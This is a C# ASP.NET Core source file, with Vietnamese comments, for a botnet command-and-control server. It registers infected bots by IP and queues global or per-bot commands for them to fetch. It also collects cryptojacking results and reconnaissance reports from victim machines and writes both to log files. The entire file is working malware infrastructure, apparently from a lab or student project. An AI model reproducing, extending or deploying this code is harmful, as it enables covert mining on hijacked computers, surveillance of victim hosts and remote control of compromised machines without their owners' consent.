using Microsoft.AspNetCore.Mvc;
using System.Collections.Concurrent;
using System.IO;
using System.Text.RegularExpressions;

namespace CncServer.Controllers
{
    // === MODEL NHẬN TỪ CLIENT ===
    public class BotInfoPayload
    {
        public string Status { get; set; } = string.Empty;
    }

    public class LogPayload
    {
        public string Message { get; set; } = string.Empty; 
    }

    public class ResultPayload
    {
        public long Nonce { get; set; }
        public string Hash { get; set; } = string.Empty;
    }
    // Model cho request đặt lệnh
    public class SetCommandRequest
    {
        public string Command { get; set; } = string.Empty;
        public string TargetBotIp { get; set; } = ""; // Thêm trường này: rỗng = tất cả
    }

    public class BotInfo
    {
        public string BotIp { get; set; } = string.Empty;
        public DateTime LastSeen { get; set; }
        public string Status { get; set; } = string.Empty;
    }
    public class CryptoJackResult
    { 
        public string BotIp { get; set; } = string.Empty;
        public long Nonce { get; set; }
        public string Hash { get; set; } = string.Empty;
        public DateTime Timestamp { get; set; } = DateTime.UtcNow;
    }
    public class ReconPayload
    {
        public string Report { get; set; } = string.Empty;
    }


    [ApiController]
    [Route("bot")]
    public class BotController : ControllerBase
    {
        private static readonly ConcurrentDictionary<string, BotInfo> _bots = new ConcurrentDictionary<string, BotInfo>();
        private static string _globalCommand = "idle";
        //private static readonly ConcurrentBag<CryptoJackResult> _results = new ConcurrentBag<CryptoJackResult>();
        // Dictionary lưu lệnh riêng cho từng Bot IP: Key = IP, Value = Command
        private static readonly ConcurrentDictionary<string, string> _targetedCommands = new ConcurrentDictionary<string, string>();
        private static readonly object _fileLock = new object();

        private const string LogFolder = "log";
        private const string MinedHashesFileName = "mined_hashes.txt";
        private const string ReconFilePrefix = "recon_";

        // === Constructor: Tự động tạo folder log khi khởi động ===
        static BotController()
        {
            try
            {
                if (!Directory.Exists(LogFolder))
                {
                    Directory.CreateDirectory(LogFolder);
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine($"[INIT] Created log folder at: {Path.GetFullPath(LogFolder)}");
                    Console.ResetColor();
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[ERROR] Failed to create log folder: {ex.Message}");
                Console.ResetColor();
            }
        }

        // Hàm helper để lấy IP của Bot
        private string GetBotIp()
        {
            //return HttpContext.Connection.RemoteIpAddress?.ToString() ?? "Unknown";
            var ip = HttpContext.Connection.RemoteIpAddress;
            if (ip == null) return "Unknown";

            // Nếu là IPv4 bọc trong IPv6 (::ffff:10.0.2.6) -> Chuyển về 10.0.2.6
            if (ip.IsIPv4MappedToIPv6)
            {
                return ip.MapToIPv4().ToString();
            }
            return ip.ToString();
        }

        [HttpPost("checkin")]
        public IActionResult CheckIn([FromBody] BotInfoPayload payload)
        {
            string ip = GetBotIp();
            string newStatus = payload?.Status ?? "unknown";

            bool shouldLog = false;
            string logMsg = "";

            // Kiểm tra xem Bot này đã có trong danh sách chưa
            if (_bots.TryGetValue(ip, out BotInfo existingBot))
            {
                // Nếu Bot ĐÃ tồn tại: Chỉ log nếu Status bị thay đổi
                if (existingBot.Status != newStatus)
                {
                    shouldLog = true;
                    logMsg = $"[*] Bot {ip} changed status: {existingBot.Status} -> {newStatus}";
                }

                // Cập nhật thông tin mới (Status + LastSeen)
                existingBot.Status = newStatus;
                existingBot.LastSeen = DateTime.UtcNow;
            }
            else
            {
                // Nếu Bot CHƯA tồn tại (Bot mới): Luôn log
                shouldLog = true;
                logMsg = $"[+] New Bot connected: {ip} | Status: {newStatus}";

                var newBot = new BotInfo
                {
                    BotIp = ip,
                    LastSeen = DateTime.UtcNow,
                    Status = newStatus
                };
                _bots[ip] = newBot;
            }

            // Chỉ in ra màn hình nếu cần thiết
            if (shouldLog)
            {
                Console.ForegroundColor = ConsoleColor.Blue;
                Console.WriteLine(logMsg);
                Console.ResetColor();
            }

            return Ok();
        }

        [HttpGet("getcommand")]
        public IActionResult GetCommand()
        {
            string ip = GetBotIp();

            if (_bots.ContainsKey(ip))
            {
                // Cập nhật last seen khi bot hỏi lệnh
                _bots[ip].LastSeen = DateTime.UtcNow;
            }
            // ƯU TIÊN 1: Kiểm tra xem có lệnh riêng cho bot này không
            if (_targetedCommands.TryGetValue(ip, out string targetCmd))
            {
                _targetedCommands.TryRemove(ip, out _); 

                return Ok(new { command = targetCmd });
            }

            // ƯU TIÊN 2: Trả về lệnh toàn cục
            return Ok(new { command = _globalCommand });
        }

        // === NÂNG CẤP: Nhận một model JSON thay vì chuỗi thô ===
        [HttpPost("setcommand")]
        public IActionResult SetCommand([FromBody] SetCommandRequest request)
        {
            if (string.IsNullOrWhiteSpace(request?.Command))
            {
                return BadRequest("Command model is invalid.");
            }
            string cmd = request.Command.ToLower(); // Chuẩn hóa lệnh thành chữ thường
            // Nếu có TargetBotIp, lưu vào danh sách lệnh riêng
            if (!string.IsNullOrWhiteSpace(request.TargetBotIp) && request.TargetBotIp != "ALL")
            {
                _targetedCommands[request.TargetBotIp] = cmd;
                Console.WriteLine($"\n[*] Targeted command '{cmd}' set for Bot IP: {request.TargetBotIp}\n");
                return Ok($"Command '{cmd}' queued for bot {request.TargetBotIp}");
            }
            else
            {
                // Nếu không có target hoặc target="ALL", đặt làm lệnh toàn cục và xóa các lệnh riêng lẻ
                _globalCommand = cmd;
                _targetedCommands.Clear(); // Xóa lệnh riêng để mọi bot tuân theo lệnh global
                Console.WriteLine($"\n[*] Global command issued: '{_globalCommand}'\n");
                return Ok($"Global command set to: {_globalCommand}");
            }
        }

        [HttpGet("list")]
        public IActionResult ListBots()
        {
            return Ok(_bots.Values);
        }

        [HttpPost("submitresult")]
        public IActionResult SubmitResult([FromBody] ResultPayload payload)
        {
            if (payload == null) return BadRequest("Invalid result data.");

            string ip = GetBotIp();
            //result.BotIp = GetBotIp();
            var result = new CryptoJackResult
            {
                BotIp = ip,                                  // ← ĐỔI TÊN
                Nonce = payload.Nonce,
                Hash = payload.Hash,
                Timestamp = DateTime.UtcNow
            };
            //result.Timestamp = DateTime.UtcNow;

            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[SUCCESS] Bot {result.BotIp} found a hash!");
            Console.WriteLine($"   -> Nonce: {result.Nonce}, Hash: {result.Hash.Substring(0, 10)}...");
            Console.ResetColor();
            try
            {
                // Format log dễ parse: [Time]|IP|Nonce|Hash
                string logFilePath = Path.Combine(LogFolder, MinedHashesFileName);
                string logEntry = $"{result.Timestamp:yyyy-MM-dd HH:mm:ss}|{result.BotIp}|{result.Nonce}|{result.Hash}";

                lock (_fileLock)
                {
                    System.IO.File.AppendAllText(logFilePath, logEntry + Environment.NewLine);
                }
                Console.ForegroundColor = ConsoleColor.DarkGray;
                Console.WriteLine($"   -> [DISK] Saved entry to {MinedHashesFileName}");
                Console.ResetColor();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[ERROR] Write file error: {ex.Message}");
            }

            return Ok("Result received.");
        }


        [HttpPost("submitrecon")]
        public IActionResult SubmitRecon([FromBody] ReconPayload payload)
        {
            if (payload == null || string.IsNullOrWhiteSpace(payload.Report))
                return BadRequest("Invalid recon data.");

            string ip = GetBotIp();
            string timestamp = DateTime.UtcNow.ToString("yyyyMMdd_HHmmss");

            // Tạo tên file riêng cho từng bot: recon_IP_Time.txt
            // Thay thế dấu : trong IP (nếu là IPv6) để tránh lỗi tên file
            string safeIp = ip.Replace(":", "_").Replace(".", "_");
            //string fileName = $"recon_{safeIp}_{timestamp}.txt";
            string fileName = Path.Combine(LogFolder, $"{ReconFilePrefix}{safeIp}.txt");

            Console.ForegroundColor = ConsoleColor.Magenta;

            bool fileExists = System.IO.File.Exists(fileName);

            if (fileExists)
            {
                Console.WriteLine($"[RECON] Updating report from {ip} -> {fileName}");
            }
            else
            {
                Console.WriteLine($"[RECON] Received NEW report from {ip} -> {fileName}");
            }
            Console.ResetColor();


            try
            {
                // Lưu file vào thư mục chạy của Server
                System.IO.File.WriteAllText(fileName, payload.Report);

                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[SUCCESS] Recon report saved/updated at {DateTime.Now:HH:mm:ss}");
                Console.ResetColor();

                return Ok("Recon report saved.");
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[ERROR] Save recon file failed: {ex.Message}");
                Console.ResetColor();
                return StatusCode(500, "Internal Server Error");
            }
        }

        [HttpPost("log")]
        public IActionResult LogStatus([FromBody] LogPayload payload)
        {
            //if (logRequest == null) return BadRequest("Invalid log data.");
            if (payload == null) return BadRequest("Invalid log data.");

            // Tự lấy IP làm ID
            string ip = GetBotIp();

            // In log ra console của SERVER với màu sắc để dễ phân biệt
            Console.ForegroundColor = ConsoleColor.Gray;
            //Console.WriteLine($"[LOG] {ip}: {logRequest.Message}");
            Console.WriteLine($"[LOG] {ip}: {payload.Message}");
            Console.ResetColor();

            return Ok("Log received.");
        }
    }
}